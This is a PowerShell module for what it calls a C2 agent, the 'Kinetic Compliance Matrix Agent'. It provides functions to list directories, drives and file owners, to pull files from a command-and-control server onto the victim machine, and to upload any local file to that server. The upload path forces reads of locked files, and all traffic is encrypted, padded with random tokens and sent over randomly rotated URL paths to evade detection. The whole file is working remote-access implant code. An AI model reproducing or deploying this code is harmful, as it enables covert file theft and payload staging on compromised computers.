# File Operations Module for Kinetic Compliance Matrix Agent
# This module provides functions for file system navigation, upload, and download

function Get-DirectoryListing {
    <#
    .SYNOPSIS
        Gets directory listing with better formatting for C2 interface
    .DESCRIPTION
        Lists files and folders in the specified directory with detailed information
    .PARAMETER DirectoryPath
        Path to the directory to list
    #>
    param(
        [Parameter(Mandatory=$true)]
        [string]$DirectoryPath
    )
    
    try {
        # Expand environment variables if present
        if ($DirectoryPath -match '%\w+%') {
            $DirectoryPath = [System.Environment]::ExpandEnvironmentVariables($DirectoryPath)
        }
        
        # Log the expanded path
        Write-Host "Listing directory: $DirectoryPath"
        
        # Check if directory exists
        if (-not (Test-Path -Path $DirectoryPath -PathType Container)) {
            return "Error: Directory not found: $DirectoryPath"
        }
        
        # Get items with error handling
        try {
            $items = Get-ChildItem -Path $DirectoryPath -Force -ErrorAction Stop | 
            Select-Object Name, Length, LastWriteTime, Attributes, @{
                Name = "Type";
                Expression = {
                    if ($_.PSIsContainer) { "Directory" } else { "File" }
                }
            }
            
            # Convert to JSON for structured display in C2 interface
            $jsonResult = ConvertTo-Json -InputObject $items -Compress -Depth 2
            # Log first 100 chars of result
            Write-Host "Listing result (first 100 chars): $($jsonResult.Substring(0, [Math]::Min(100, $jsonResult.Length)))"
            return $jsonResult
        }
        catch {
            # Try a simpler approach if the first method fails
            Write-Host "Standard method failed, trying alternative approach: $_"
            $result = @()
            
            # Manually create directory entries
            foreach ($item in (Get-ChildItem -Path $DirectoryPath -Force -ErrorAction SilentlyContinue)) {
                $type = if ($item.PSIsContainer) { "Directory" } else { "File" }
                $size = if ($item.PSIsContainer) { 0 } else { $item.Length }
                
                $entry = @{
                    "Name" = $item.Name
                    "Type" = $type
                    "Length" = $size
                    "LastWriteTime" = $item.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
                    "Attributes" = $item.Attributes.ToString()
                }
                $result += $entry
            }
            
            # Convert to JSON and return
            $jsonResult = ConvertTo-Json -InputObject $result -Compress -Depth 2
            return $jsonResult
        }
    }
    catch {
        Write-Host "Error listing directory: $_"
        return "Error listing directory: $_"
    }
}

# Function to download a file from the server to the client
# This version avoids recursive calling
function Download-File {
    <#
    .SYNOPSIS
        Downloads a file from the server to the client
    .DESCRIPTION
        Gets a file from the C2 server and saves it to the specified path
    .PARAMETER FilePath
        Path to the file on the server
    .PARAMETER DestinationPath
        Path where the file should be saved (optional - will use same filename at %TEMP% if not specified)
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath,
        
        [Parameter(Mandatory=$false)]
        [string]$DestinationPath = ""
    )
    
    try {
        # Expand environment variables if present in paths
        if ($FilePath -match '%\w+%') {
            $FilePath = [System.Environment]::ExpandEnvironmentVariables($FilePath)
        }
        
        if ($DestinationPath -match '%\w+%') {
            $DestinationPath = [System.Environment]::ExpandEnvironmentVariables($DestinationPath)
        }
        
        # If no destination specified, use temp folder with original filename
        if ([string]::IsNullOrEmpty($DestinationPath)) {
            $filename = [System.IO.Path]::GetFileName($FilePath)
            $DestinationPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), $filename)
        }
        
        # Make sure the destination path ends with a filename, not just a directory
        if ($DestinationPath.EndsWith('\') -or $DestinationPath.EndsWith('/')) {
            # If only a directory was provided, append the source filename
            $filename = [System.IO.Path]::GetFileName($FilePath)
            $DestinationPath = Join-Path -Path $DestinationPath -ChildPath $filename
        }
        
        # Create destination directory if it doesn't exist
        $destinationDir = [System.IO.Path]::GetDirectoryName($DestinationPath)
        if (-not (Test-Path -Path $destinationDir -PathType Container)) {
            Write-Host "Creating directory: $destinationDir"
            New-Item -Path $destinationDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
        }
        
        # Create file request object
        $fileRequest = @{
            FilePath = $FilePath
            Destination = $DestinationPath
        }
        
        # Create the operation payload
        $operationPayload = @{
            "op_type" = "file_down"
            "payload" = $fileRequest
        }
        
        # Convert to JSON
        $operationJson = ConvertTo-Json -InputObject $operationPayload -Compress
        
        # Encrypt the data
        $encryptedData = Encrypt-Data -PlainText $operationJson
        
        # Create web client
        $webClient = New-WebClient
        
        # Prepare the payload with proper JSON structure
        $payload = @{
            d = $encryptedData       # Data field
            t = Get-RandomToken      # Token padding
        }
        
        # Add client ID only during first contact
        if ($global:firstContact) {
            $payload.c = $global:clientID
        }
        
        # Convert payload to JSON with proper handling
        $payloadJson = ConvertTo-Json -InputObject $payload -Compress -Depth 4
        
        # Select a path (either random from pool or specific file request path)
        $downloadPath = $null
        
        # If path rotation is enabled and we have a path pool, use a random path 70% of the time
        if ($global:pathRotationEnabled -and $global:pathPool -and $global:pathPool.Count -gt 0) {
            if ((Get-Random -Minimum 1 -Maximum 100) -le 70) {
                $randomIndex = Get-Random -Minimum 0 -Maximum $global:pathPool.Count
                $downloadPath = $global:pathPool[$randomIndex]
            }
        }
        
        # If we didn't select a random path, use the dedicated file request path
        if (-not $downloadPath) {
            $downloadPath = Get-CurrentPath -PathType "file_request_path"
        }
        
        # Send the request
        $requestUrl = "http://$($global:serverAddress)$downloadPath"
        Write-Host "Sending file request to $requestUrl"
        $response = $webClient.UploadString($requestUrl, $payloadJson)
        
        # Parse the response with proper error handling
        try {
            # First validate we actually got JSON back
            if (-not $response.StartsWith('{')) {
                throw "Server response is not valid JSON: $response"
            }
            
            $responseObj = ConvertFrom-Json -InputObject $response -ErrorAction Stop
            
            # Check if response has the expected structure
            if (-not $responseObj.d) {
                throw "Response missing data field 'd'"
            }
            
            $encryptedData = $responseObj.d
            
            # Decrypt the response
            $decryptedResponse = Decrypt-Data -EncryptedBase64 $encryptedData
            
            # Validate the decrypted response is proper JSON
            try {
                $fileResponse = ConvertFrom-Json -InputObject $decryptedResponse -ErrorAction Stop
            }
            catch {
                Write-Host "Error parsing decrypted response as JSON: $_"
                Write-Host "Raw decrypted response: $decryptedResponse"
                throw "Invalid JSON in decrypted response"
            }
            
            # Check if file was found
            if ($fileResponse.Status -eq "Error") {
                return "Error: $($fileResponse.Message)"
            }
            
            # Get file content and save it
            $fileContent = [System.Convert]::FromBase64String($fileResponse.FileContent)
            
            # Write bytes to file with error handling
            try {
                # Make one more permission check right before writing
                [System.IO.File]::WriteAllBytes($DestinationPath, $fileContent)
                Write-Host "File successfully written to $DestinationPath"
            }
            catch [System.UnauthorizedAccessException] {
                # Permission issue - fall back to temp
                $newPath = Join-Path -Path ([System.IO.Path]::GetTempPath()) -ChildPath ([System.IO.Path]::GetFileName($DestinationPath))
                Write-Host "Permission denied, falling back to $newPath"
                [System.IO.File]::WriteAllBytes($newPath, $fileContent)
                $DestinationPath = $newPath
            }
            
            return "Successfully downloaded $($fileResponse.FileName) ($($fileResponse.FileSize) bytes) to $DestinationPath"
        }
        catch {
            Write-Host "Error processing server response: $_"
            return "Error downloading file from server: $_"
        }
    }
    catch {
        Write-Host "Error in file download operation: $_"
        return "Error downloading file: $_"
    }
}

# Function to upload a file from the client to the server
# This version avoids recursive calling and fixes the parameter issue
function Upload-File {
    <#
    .SYNOPSIS
        Uploads a file from the client to the server
    .DESCRIPTION
        Sends a file from the client to the C2 server
    .PARAMETER SourcePath
        Path to the file on the client to upload
    .PARAMETER DestinationPath
        Path on the server where the file should be saved
    .PARAMETER Description
        Optional description for the uploaded file
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$SourcePath,
        
        [Parameter(Mandatory=$false)]
        [string]$DestinationPath = "",
        
        [Parameter(Mandatory=$false)]
        [string]$Description = ""
    )
    
    try {
        # Expand environment variables if present in source path
        if ($SourcePath -match '%\w+%') {
            $SourcePath = [System.Environment]::ExpandEnvironmentVariables($SourcePath)
        }
        
        # Expand environment variables if present in destination path
        if ($DestinationPath -match '%\w+%') {
            $DestinationPath = [System.Environment]::ExpandEnvironmentVariables($DestinationPath)
        }
        
        # Check if file exists
        if (-not (Test-Path -Path $SourcePath -PathType Leaf)) {
            return "Error: File not found: $SourcePath"
        }
        
        # Try to read file with proper error handling for locked files
        $fileBytes = $null
        try {
            # First attempt: standard read
            $fileBytes = [System.IO.File]::ReadAllBytes($SourcePath)
        }
        catch [System.IO.IOException] {
            Write-Host "File is in use, trying alternative read method"
            try {
                # Second attempt: Open with FileShare.ReadWrite to allow reading even if file is in use
                $fileStream = [System.IO.File]::Open($SourcePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
                $memStream = New-Object System.IO.MemoryStream
                $fileStream.CopyTo($memStream)
                $fileBytes = $memStream.ToArray()
                $fileStream.Close()
                $memStream.Close()
            }
            catch {
                # Third attempt: try to make a copy of the file first
                Write-Host "Alternative read failed, trying to make a copy first"
                $tempFile = [System.IO.Path]::GetTempFileName()
                Copy-Item -Path $SourcePath -Destination $tempFile -Force
                $fileBytes = [System.IO.File]::ReadAllBytes($tempFile)
                Remove-Item -Path $tempFile -Force
            }
        }
        
        # If we still couldn't read the file, return an error
        if ($null -eq $fileBytes) {
            return "Error: Could not read file content - file may be locked or in use"
        }
        
        # Convert to base64
        $fileContent = [System.Convert]::ToBase64String($fileBytes)
        
        # Prepare file upload data
        $fileData = @{
            FileName = (Split-Path -Path $SourcePath -Leaf)
            FileContent = $fileContent
            FileSize = $fileBytes.Length
            SourcePath = $SourcePath
            DestinationPath = $DestinationPath  # Include destination path in the upload data
            Description = $Description
        }
        
        # Create the operation payload
        $operationPayload = @{
            "op_type" = "file_up"
            "payload" = $fileData
        }
        
        # Convert to JSON
        $operationJson = ConvertTo-Json -InputObject $operationPayload -Compress
        
        # Encrypt the data
        $encryptedData = Encrypt-Data -PlainText $operationJson
        
        # Create web client
        $webClient = New-WebClient
        
        # Prepare the payload
        $payload = @{
            d = $encryptedData        # Data field
            t = Get-RandomToken       # Token padding
        }
        
        # Add client ID only during first contact
        if ($global:firstContact) {
            $payload.c = $global:clientID
        }
        
        $payloadJson = ConvertTo-Json -InputObject $payload -Compress
        
        # Select a path (either random from pool or specific file upload path)
        $uploadPath = $null
        
        # If path rotation is enabled and we have a path pool, use a random path 70% of the time
        if ($global:pathRotationEnabled -and $global:pathPool -and $global:pathPool.Count -gt 0) {
            if ((Get-Random -Minimum 1 -Maximum 100) -le 70) {
                $randomIndex = Get-Random -Minimum 0 -Maximum $global:pathPool.Count
                $uploadPath = $global:pathPool[$randomIndex]
            }
        }
        
        # If we didn't select a random path, use the dedicated file upload path
        if (-not $uploadPath) {
            $uploadPath = Get-CurrentPath -PathType "file_upload_path"
        }
        
        # Ensure server address is valid and properly formatted
        if ([string]::IsNullOrEmpty($global:serverAddress) -or $global:serverAddress -eq "/" -or $global:serverAddress -eq "//") {
            Write-Host "Warning: Server address is empty or invalid. Setting to localhost."
            $global:serverAddress = "localhost"
        }
        
        # Remove any trailing slashes to prevent URL formatting issues
        if ($global:serverAddress.EndsWith("/")) {
            $global:serverAddress = $global:serverAddress.TrimEnd('/')
            Write-Host "Removed trailing slash from server address: $global:serverAddress"
        }
        
        # Construct the upload URL with validated server address
        $uploadUrl = "http://$($global:serverAddress)$uploadPath"
        Write-Host "Sending file upload to $uploadUrl"
        
        # Debug information to help diagnose URL issues
        Write-Host "Server address: $($global:serverAddress)"
        Write-Host "Upload path: $uploadPath"
        
        # Check for common URL formatting issues
        if ($uploadUrl -match "http:///$") {
            # Missing server address
            Write-Host "Error: Server address is missing or empty. Using default localhost address."
            $uploadUrl = "http://localhost$uploadPath"
        }
        elseif ($uploadUrl -match "http:///") {
            # Triple slash issue - fix by replacing with double slash and adding localhost
            Write-Host "Error: Invalid URL format with triple slash. Fixing format."
            $uploadUrl = $uploadUrl -replace "http:///", "http://localhost/"
        }
        
        try {
            $response = $webClient.UploadString($uploadUrl, $payloadJson)
            
            # Parse and process the response if present
            if ($response -and $response.StartsWith('{')) {
                try {
                    $responseObj = ConvertFrom-Json -InputObject $response -ErrorAction Stop
                    
                    if ($responseObj.d) {
                        # Decrypt the response
                        $decryptedResponse = Decrypt-Data -EncryptedBase64 $responseObj.d
                        $responseData = ConvertFrom-Json -InputObject $decryptedResponse -ErrorAction Stop
                        
                        if ($responseData.Status -eq "Success") {
                            return "Successfully uploaded $SourcePath to server ($($fileBytes.Length) bytes): $($responseData.Message)"
                        }
                        else {
                            return "Upload completed with status: $($responseData.Status) - $($responseData.Message)"
                        }
                    }
                }
                catch {
                    Write-Host "Error processing response: $_"
                }
            }
            
            # If we couldn't parse the response or there was no structured response
            return "Successfully uploaded $SourcePath to server ($($fileBytes.Length) bytes)"
        }
        catch {
            Write-Host "Error sending file upload: $_"
            return "Error uploading file: $_"
        }
    }
    catch {
        Write-Host "Error in file upload operation: $_"
        return "Error uploading file: $_"
    }
}

function Get-DriveInfo {
    <#
    .SYNOPSIS
        Gets information about available drives
    .DESCRIPTION
        Returns detailed information about all available drives
    #>
    try {
        $drives = Get-CimInstance -Class Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | ForEach-Object {
            [PSCustomObject]@{
                DriveLetter = $_.DeviceID
                VolumeName = $_.VolumeName
                DriveType = "Fixed"
                SizeGB = [math]::Round($_.Size / 1GB, 2)
                FreeSpaceGB = [math]::Round($_.FreeSpace / 1GB, 2)
                PercentFree = [math]::Round(($_.FreeSpace / $_.Size) * 100, 2)
            }
        }
        
        # Add removable drives
        Get-CimInstance -Class Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | ForEach-Object {
            $drives += [PSCustomObject]@{
                DriveLetter = $_.DeviceID
                VolumeName = $_.VolumeName
                DriveType = "Removable"
                SizeGB = if ($_.Size) { [math]::Round($_.Size / 1GB, 2) } else { 0 }
                FreeSpaceGB = if ($_.FreeSpace) { [math]::Round($_.FreeSpace / 1GB, 2) } else { 0 }
                PercentFree = if ($_.Size -gt 0) { [math]::Round(($_.FreeSpace / $_.Size) * 100, 2) } else { 0 }
            }
        }
        
        # Convert to JSON
        $jsonResult = ConvertTo-Json -InputObject $drives -Compress
        return $jsonResult
    }
    catch {
        return "Error getting drive information: $_"
    }
}

function Get-FileOwner {
    <#
    .SYNOPSIS
        Gets the owner of a file or directory
    .DESCRIPTION
        Returns the owner of the specified file or directory
    .PARAMETER Path
        Path to the file or directory
    #>
    param(
        [Parameter(Mandatory=$true)]
        [string]$Path
    )
    
    try {
        $acl = Get-Acl -Path $Path -ErrorAction SilentlyContinue
        if ($acl) {
            return $acl.Owner
        } else {
            return "Unknown"
        }
    }
    catch {
        return "Unknown"
    }
}

function Get-FileSystemItems {
    <#
    .SYNOPSIS
        Gets file system items (files and folders) with detailed information
    .DESCRIPTION
        Provides a detailed listing of files and folders in the specified directory
    .PARAMETER Path
        Path to the directory to list
    #>
    param(
        [Parameter(Mandatory=$true)]
        [string]$Path
    )
    
    try {
        # Expand environment variables if present
        if ($Path -match '%\w+%') {
            $Path = [System.Environment]::ExpandEnvironmentVariables($Path)
        }
        
        # Check if directory exists
        if (-not (Test-Path -Path $Path -PathType Container)) {
            return "Error: Directory not found: $Path"
        }
        
        # Get items with error handling
        $itemsInfo = Get-ChildItem -Path $Path -Force -ErrorAction SilentlyContinue | ForEach-Object {
            $type = if ($_.PSIsContainer) { "Directory" } else { "File" }
            $size = if ($_.PSIsContainer) { "N/A" } else { $_.Length }
            $extension = if ($_.PSIsContainer) { "" } else { $_.Extension }
            
            # Create object with properties
            [PSCustomObject]@{
                Name = $_.Name
                FullPath = $_.FullName
                Type = $type
                Size = $size
                Extension = $extension
                Created = $_.CreationTime
                Modified = $_.LastWriteTime
                Attributes = $_.Attributes.ToString()
                IsHidden = $_.Attributes -band [System.IO.FileAttributes]::Hidden
                IsSystem = $_.Attributes -band [System.IO.FileAttributes]::System
                IsReadOnly = $_.Attributes -band [System.IO.FileAttributes]::ReadOnly
                Owner = (Get-FileOwner -Path $_.FullName)
            }
        }
        
        # Convert to JSON
        $jsonResult = ConvertTo-Json -InputObject $itemsInfo -Depth 3 -Compress
        return $jsonResult
    }
    catch {
        return "Error getting file system items: $_"
    }
}